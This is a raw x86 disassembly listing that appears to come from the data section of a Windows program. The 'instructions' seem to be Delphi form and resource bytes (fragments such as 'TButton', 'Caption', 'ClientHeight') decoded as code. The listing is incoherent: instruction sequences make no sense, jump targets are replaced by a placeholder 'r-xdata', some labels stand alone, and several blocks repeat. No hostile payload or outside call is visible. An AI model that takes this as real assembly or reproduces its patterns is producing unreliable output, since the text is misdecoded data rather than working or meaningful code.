fld [ eax + eax - 0x14 ]
loop r-xdata
insb
lea eax [ eax ]
mov [ eax + 0x43 ] bl
insd
inc ebx
je r-xdata
inc ebx
outsd
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
add [ ebp + edx * 8 + 0x44 ] cl
inc ecx
add [ eax - 0x70 ] al
add [ edx + ebp * 4 - 0x43afffbc ] ch
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
inc ebx
add [ eax - 0x69 ] ah
outsd
add [ ecx ] cl
push 0x74754273
je r-xdata
add [ eax ] al
add [ eax + 0x43 ] bl
outsb
je r-xdata
jbe r-xdata
inc ebx
inc ebx
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx ] cl
outsd
outsb
je r-xdata
push esp
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
add [ eax ] cl
sbb [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
enter 0x4352 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x56100040 ] cl
inc ebx
je r-xdata
push cs
push esp
dec eax
popad
jb r-xdata
outsd
insb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
arpl [ ebx + 0x4d ] bp
outsd
jbe r-xdata
js r-xdata
inc ecx
add [ eax + 0x3c0041c6 ] al
push esp
inc ebx
add ah dh
xchg edx eax
inc ecx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
inc ebx
add al cl
push edx
inc ebx
insd
inc esp
jb r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add ah al
pop ecx
ja r-xdata
push eax
jb r-xdata
arpl [ eax + eax + 0x7 ] si
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
sub_4352c9
push edx
inc ebx
add [ edi ] al
push cs
push esp
dec eax
popad
jb r-xdata
add [ eax ] eax
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
test [ edx + 0x43 ] dl
add [ edx + edx * 4 ] bl
inc ecx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd865646f
cmp eax 0x200045
add bh bh
les esi [ edi + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0004 ] al
insd
popad
dec ecx
outsb
js r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
pop ds
add [ eax ] al
jmp esp
inc ecx
add [ eax + eax ] ah
add bh bh
sbb al 0x76
inc ebx
add [ eax ] dh
jbe r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop es
add [ esi ] cl
push eax
popad
jb r-xdata
adc [ eax ] al
sbb [ eax ] al
add bh bh
add al 0x77
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x27
add [ eax ] al
add eax 0x614d0800
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080003 ] al
add [ eax ] al
add [ eax ] eax
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ esi ] bl
add [ eax ] al
[ esi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ edi + eax * 4 + 0x1c0041 ] bl
add bh bh
aam 0x76
imul esp [ esp + esi * 2 + 0x68 ] 0x4354c090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx * 2 + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0xfffffffff04397e9
push esp
inc ebx
add [ eax + eax ] bl
add [ eax ] al
dec eax
xchg edx eax
inc ecx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add al bl
rol [ ecx ] 0x34
mov ebp 0xbd3c0041
inc ecx
outsb
je r-xdata
inc [ edi + esi * 2 + 0x43 ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc al 0x0
add bh bh
sub [ edi + 0x43 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
add [ eax ] dl
inc eax
add [ 0x38ff0000 ] ah
jbe r-xdata
insd
inc ebx
je r-xdata
add ah bl
retn 0x41
push esp
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf465646f
push ecx
inc ebx
add [ 0x44ff0000 ] bl
ja r-xdata
js r-xdata
add [ eax ] al
call [ edi + esi * 2 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040009 ] al
add [ ecx ] al
add [ eax ] al
inc ebp
jbe r-xdata
insb
jae r-xdata
add [ edx + eax * 8 + 0x41 ] al
add [ eax - 0x73ffbe3a ] cl
mov [ ecx ] 0x90
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5705000a ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add eax 0x6c797453
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
adc [ esi + 0x43 ] dl
outsb
je r-xdata
add [ ebx + 0x435530c0 ] cl
add [ ebx ] al
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
mov [ ecx ] 0x80
mov [ ecx ] 0x3c
nop
inc ebx
add [ ecx ] al
add [ eax ] al
arpl [ ebx + 0x45 ] bp
outsd
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add al 0x8
or eax 0x64616548
jb r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
je r-xdata
outsb
je r-xdata
jbe r-xdata
inc ebp
jns r-xdata
jae r-xdata
outsd
popad
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
inc ebx
add al cl
push edx
inc ebx
add [ ebx + 0x435678c0 ] cl
add [ eax ] cl
jbe r-xdata
jb r-xdata
pop es
outsb
dec esi
outsd
je r-xdata
outsd
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx * 2 + 0x740c0043 ] ch
jae r-xdata
jne r-xdata
outsd
dec eax
popad
jb r-xdata
add ah al
pop ecx
inc ebx
add al cl
push edx
inc ebx
add [ eax + edx + 0x40 ] dl
add [ edx * 2 - 0x3f74ffbd ] ch
adc [ edi + 0x43 ] dl
add [ eax ] cl
adc [ ebx + edx * 2 + 0x65 ] edx
arpl [ ecx + ebp * 2 + 0x6f ] si
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
outsd
outsb
je r-xdata
imul edx [ ebx + 0x74 ] 0x61
outsd
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
outsb
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add ah al
pop ecx
inc ebp
je r-xdata
jb r-xdata
jae r-xdata
je r-xdata
or [ esi ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
add [ ecx + edx + 0x52c80040 ] al
inc ebx
inc ebp
jbe r-xdata
outsb
push cs
push esp
push esp
outsd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
arpl [ ebx + 0x53 ] bp
outsb
inc esp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
imul ebp [ edi + 0x6e ] 0x63617254
add cl [ eax ]
or eax 0x64616548
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
insd
dec eax
popad
jb r-xdata
popad
arpl [ ebx + 0x42 ] bp
imul ebp [ gs : bp + 0xb ] 0x72547374
popad
insd
dec eax
popad
jb r-xdata
inc eax
add [ eax + 0x4358 ] cl
jb r-xdata
add [ ebx + edx * 2 ] ecx
push esp
inc ebx
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jns r-xdata
outsd
insd
dec eax
add al cl
push edx
inc ebx
add [ eax ] al
adc [ eax ] al
nop
xchg esp eax
push edi
inc ebx
add [ eax ] cl
and [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
outsb
je r-xdata
jb r-xdata
je r-xdata
sbb [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
outsd
outsb
je r-xdata
outsd
outsb
je r-xdata
popad
or dh [ ebx + esi * 2 + 0x54 ]
jb r-xdata
add [ eax ] eax
outsd
outsb
je r-xdata
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
add [ eax ] bl
xor [ edx + 0x42 ] al
add [ ecx + ebx * 2 + 0x2780043 ] ch
add [ eax ] al
insb
xor eax [ eax + eax + 0x18 ]
add [ eax ] al
pop esp
pop ecx
inc ebx
adc edx [ eax + ecx * 2 + 0x65 ]
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
or al 0x53
pop es
inc edx
outsd
outsd
insb
popad
outsb
xor eax [ eax ]
inc esp
xor eax [ eax ]
mov [ ecx + 0x43 ] bh
add [ edx - 0x5553ffbc ] bh
inc esp
add [ eax - 0x44 ] dl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
pop eax
inc ebx
add [ gs : eax ] eax
dec eax
popad
popad
je r-xdata
add al 0x8
push es
push ebx
insd
dec eax
popad
jb r-xdata
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
jb r-xdata
outsd
insb
or [ edi ] al
je r-xdata
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
jb r-xdata
arpl [ ebx + 0x45 ] bp
outsb
or [ fs : ebx + 0x6f ] al
insd
inc ebx
je r-xdata
inc esp
add al al
xchg [ ebx ] eax
pushad
xchg edi eax
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
pop ecx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 2 + 0x43 ] bl
outsd
insb
add eax 0xb3004700
push [ edx - 0x4f004e01 ]
[ edi - 0x49005101 ]
add ah dh
test al 0x44
add [ ebx + edi * 2 ] cl
inc ebx
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add [ ebx + edi * 2 + 0x43 ] dh
add [ eax + 0x500044d7 ] bh
mov ch 0x44
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
inc esp
add al ah
jns r-xdata
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
inc edx
add al [ eax ]
add [ ebx + esi + 0x44 ] ch
add [ eax ] bl
je r-xdata
jb r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
or [ ebx ] cl
inc esi
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xb ] si
outsd
outsb
je r-xdata
je r-xdata
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
jae r-xdata
insb
jae r-xdata
or [ ebx + 0x6f ] al
push 0x616c4673
je r-xdata
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ edi + edx * 8 ] ah
inc esp
add [ eax - 0x3fffbc76 ] cl
mov al [ ebx ]
hlt
add [ eax - 0x4b ] dl
inc esp
add ah bl
test [ ebx ] al
rcl [ edx - 0x2a27ffbc ] 0x44
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0xb2e40040
inc esp
add [ eax ] ch
add ah al
pop ecx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 ] al
inc ebx
add [ ebx ] al
or al 0x54
loop r-xdata
insb
je r-xdata
inc ebp
imul ebp [ edi + 0x6e ] 0x73616c43
jae r-xdata
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
outsb
jb r-xdata
insd
dec eax
popad
jb r-xdata
jb r-xdata
rol [ ebp + edx * 2 + 0x17080043 ] 0x54
inc ebx
jne r-xdata
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax - 0x2fffbc88 ] bh
fld [ eax + eax - 0x14 ]
loop r-xdata
insb
lea eax [ eax ]
mov [ eax + 0x43 ] bl
insd
inc ebx
je r-xdata
inc ebx
outsd
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
add [ ebp + edx * 8 + 0x44 ] cl
inc ecx
add [ eax - 0x70 ] al
add [ edx + ebp * 4 - 0x43afffbc ] ch
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
inc ebx
add [ eax - 0x69 ] ah
outsd
add [ ecx ] cl
push 0x74754273
je r-xdata
add [ eax ] al
add [ eax + 0x43 ] bl
outsb
je r-xdata
jbe r-xdata
inc ebx
inc ebx
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx ] cl
outsd
outsb
je r-xdata
push esp
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
add [ eax ] cl
sbb [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
enter 0x4352 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x56100040 ] cl
inc ebx
je r-xdata
push cs
push esp
dec eax
popad
jb r-xdata
outsd
insb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
arpl [ ebx + 0x4d ] bp
outsd
jbe r-xdata
js r-xdata
inc ecx
add [ eax + 0x3c0041c6 ] al
push esp
inc ebx
add ah dh
xchg edx eax
inc ecx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
inc ebx
add al cl
push edx
inc ebx
insd
inc esp
jb r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add ah al
pop ecx
ja r-xdata
push eax
jb r-xdata
arpl [ eax + eax + 0x7 ] si
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
sub_43663c
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
outsb
jb r-xdata
outsd
insd
inc ebx
je r-xdata
je r-xdata
pushfd
inc bx
add [ esi * 2 + 0x726f4864 ] cl
imul edi [ edx + 0x6f ] 0x6c61746e
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
outsb
or dl [ ebp + edx * 2 + 0x44 ]
inc edx
je r-xdata
insb
add [ ebx ] al
adc [ ebp + edx * 2 + 0x70 ] dl
inc esp
outsd
ja r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + 0x750c0043 ] bl
dec eax
outsd
jb r-xdata
pop es
imul esp [ ebx + 0x61 ] 0x6f43086c
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ esi ]
push esp
push ebp
inc esp
inc ecx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
add al 0x0
add [ eax ] al
nop
inc bx
add [ ebx ] al
push cs
inc ebp
push esp
jns r-xdata
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc al 0x67
inc ebx
add [ gs : ecx + edx + 0x66e00040 ] al
inc ebx
add [ ebp + 0x67a00040 ] cl
inc ebx
add [ eax ] cl
adc [ ebp + edx * 2 + 0x44 ] dl
inc ebx
push 0x69676e61
outsb
inc ebp
jbe r-xdata
inc ebx
add [ edi ] al
jne r-xdata
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
outsb
jpe r-xdata
outsb
inc esp
outsd
ja r-xdata
inc ebx
outsd
insb
jae r-xdata
inc esp
dec esp
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
imul ebp [ esi + 0x67 ] 0x6e657645
dec esi
outsd
outsb
add eax 0x55647075
jo r-xdata
inc ebx
je r-xdata
outsb
outsb
je r-xdata
add [ ebx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0xb ] si
jb r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
insb
jae r-xdata
insb
imul esp [ edi + 0x6e ] 0x74747542
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x66 ] ah
inc ebx
add [ esi ] al
jne r-xdata
inc edx
je r-xdata
shl ah 0x66
inc ebx
add [ eax ] cl
or eax 0x43445554
push esp
jns r-xdata
or [ ebx + 0x6f ] al
jne r-xdata
add [ ebx ] ecx
inc ecx
insb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0xb ] si
jb r-xdata
add cl [ eax ]
push es
push ebx
outsb
jne r-xdata
add [ eax + 0x69 ] bh
inc ebx
add [ ecx + ebp * 2 + 0x2400043 ] ah
add [ eax ] al
insb
xor eax [ eax + eax + 0x18 ]
inc edx
popad
insb
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi ] dl
or dh [ ebp + 0x64 ]
push esi
jb r-xdata
insb
insb
outsd
ja r-xdata
or eax [ ecx + 0x6c ]
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x10000040 ] al
inc eax
add [ ebx + 0x4367e8c0 ] cl
add [ eax ] cl
adc dl [ ebp + edx * 2 + 0x44 ]
inc ebx
push 0x69676e61
inc ebx
add [ ebx ] al
or dl [ ebp + edx * 2 + 0x44 ]
insb
imul esp [ ebx + 0x6b ] 0x6e657645
je r-xdata
rcr [ edi + 0x43 ] 0x0
or [ 0x43445554 ] cl
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
push ebp
inc esp
inc ebx
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al ah
inc bx
add [ esi ] al
bound esi [ esi + ecx * 2 + 0x65 ]
js r-xdata
jbe r-xdata
insb
insd
inc ebx
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x6f430874
inc eax
add [ eax + edx ] bh
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] cl
dec esi
ja r-xdata
add [ ebp + edx * 8 + 0x44 ] cl
add [ edx + ebp * 4 - 0x43afffbc ] ch
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0xb2e40040
inc esp
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x69440900
jb r-xdata
inc eax
add [ edi ] dl
inc ebx
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x4369
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
push es
bound esi [ eax + edx * 2 + 0x72 ]
sbb [ edi + 0x43 ] ah
inc ebx
add ah ah
mov al [ ebx ]
or edx [ ebx + eax * 2 + 0x6f ]
outsb
jbe r-xdata
inc eax
add [ eax + 0x3004366 ] ah
push cs
push esp
push ebp
inc esp
dec edi
jb r-xdata
add [ eax - 0x4b ] dl
inc esp
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ edi + edx * 8 ] ah
inc esp
add [ edi ] al
add [ esi ] bh
mov al 0x4e
mov esp 0x5bd14
adc eax 0xb2ffb3bd
dec esp
mov es [ ebx ]
call 0xffffffffb843ad1f
lea eax [ ebx ]
mov [ ebp - 0x72cfffbd ] cl
inc ebx
add [ esi + ecx * 4 ] ch
inc ebx
add [ eax ] ah
pop [ ebx ]
or eax 0x73754354
je r-xdata
add [ eax - 0x3fffbb4f ] al
xchg edx eax
inc esp
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
mov esp 0xbc004495
loop r-xdata
mov dl 0x44
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
adc [ ebp + edx * 2 + 0x70 ] dl
inc esp
outsd
ja r-xdata
js r-xdata
jbe r-xdata
je r-xdata
jae r-xdata
jb r-xdata
jb r-xdata
je r-xdata
outsb
inc esp
add [ eax ] ch
xor eax [ eax ]
insd
push ebp
jo r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
inc esp
add ah al
mov eax [ ebx ]
hlt
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
inc ecx
add [ eax - 0x70 ] al
inc esp
add al dl
xchg ecx eax
inc ebx
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add al bh
mov al [ ebx ]
rcr ch 0x1
inc esp
add ah ch
loop r-xdata
add [ eax - 0x44 ] dl
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
outsb
add [ ecx + edx + 0x10000040 ] al
outsb
inc ebp
imul ebp [ edi + 0x6e ] sub_43663c
jae r-xdata
add [ ebp + edx * 8 + 0x44 ] cl
add [ edx + ebp * 4 - 0x43afffbc ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
push 0x43
add [ eax + 0x2 ] al
add [ eax ] al
push 0x42180043
inc edx
outsd
ja r-xdata
add [ eax - 0x4b ] dl
inc esp
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ edi + edx * 8 ] ah
inc esp
add [ edi ] al
push esp
push ebp
jo r-xdata
add [ eax - 0x3fffbb4f ] al
xchg edx eax
inc esp
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
inc esp
xor eax [ eax ]
mov esp 0xbc004495
loop r-xdata
mov eax eax
mov eax 0x7004369
or eax 0x73754354
je r-xdata
outsb
inc edx
jne r-xdata
outsd
ja r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
inc esp
add ah al
mov eax [ ebx ]
hlt
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
inc ecx
add [ eax - 0x70 ] al
add [ eax - 0x44 ] dl
insd
push ebp
jo r-xdata
je r-xdata
or al 0x2
cld
push 0x43
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0xb2e40040
sbb [ edx + 0x42 ] al
outsd
ja r-xdata
push eax
add [ eax ] al
outsb
mov al [ 0x61004423 ]
add [ eax ] al
add [ edi ] al
pop es
push esp
push ebp
jo r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add bh bh
fsub [ edx + 0x44 ]
add [ ebx + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
ja r-xdata
inc esp
add al dl
xchg ecx eax
inc ebx
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
nop
mov al 0x68
inc ebx
add [ eax ] ah
aaa
inc esp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
pop eax
xchg edx eax
outsd
arpl [ ecx + 0x61 ] bp
je r-xdata
add [ eax ] al
inc eax
pop [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
adc [ edx ] al
add bh bh
add bh bh
jo r-xdata
and [ edi ] dh
inc esp
add [ edx + eax ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4109000d ] al
jae r-xdata
sub [ edx + 0x43 ] ch
add [ ecx + ebp * 2 + 0x270043 ] dh
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add al bh
mov al [ ebx ]
rcr ch 0x1
inc esp
add ah ch
loop r-xdata
insb
jae r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
add ecx [ ebp + 0x69 ]
outsb
cmp al 0x10
inc eax
add [ edx ] dl
add al [ eax ]
jmp [ eax + 0x1004392 ]
cmp al 0x10
inc eax
add [ eax ] dl
add al [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add al [ eax ]
call eax
xchg esp eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ ecx ] cl
inc ecx
jb r-xdata
insb
jae r-xdata
add [ eax ] ch
push 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
push 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
adc [ eax ] eax
add ecx [ ebp + 0x61 ]
outsd
ja r-xdata
insb
imul esp [ edi + 0x6e ] 0x74747542
outsd
add [ eax + 0x66 ] ah
inc ebx
add [ eax ] ch
add al [ eax ]
call [ esp + edx * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or eax [ eax ]
or eax [ ecx + 0x6c ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
or ecx [ edi + 0x72 ]
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
add [ eax ] dl
inc eax
